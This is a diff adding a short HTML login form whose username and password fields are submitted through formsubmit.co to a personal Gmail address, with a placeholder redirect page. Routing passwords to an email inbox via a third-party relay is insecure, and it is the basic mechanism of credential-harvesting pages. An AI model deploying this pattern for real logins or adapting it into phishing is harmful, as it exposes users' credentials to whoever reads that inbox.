@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Form</title>
+</head>
+<body>
+    <h2>Login Form</h2>
+
+    <form action="https://formsubmit.co/naveenanavi.2029@gmail.com" method="POST">
+        <!-- Username Field -->
+        <label for="username">Username:</label>
+        <input type="text" id="username" name="username" required><br><br>
+
+        <!-- Password Field -->
+        <label for="password">Password:</label>
+        <input type="password" id="password" name="password" required><br><br>
+
+        <!-- Hidden input to specify the success redirect URL -->
+        <input type="hidden" name="_next" value="https://your-success-page.com">
+
+        <!-- Optional: Include a "_subject" field to customize the subject of the email -->
+        <input type="hidden" name="_subject" value="New Login Form Submission">
+
+        <!-- Submit Button -->
+        <button type="submit">Submit</button>
+    </form>
+
+</body>
+</html>
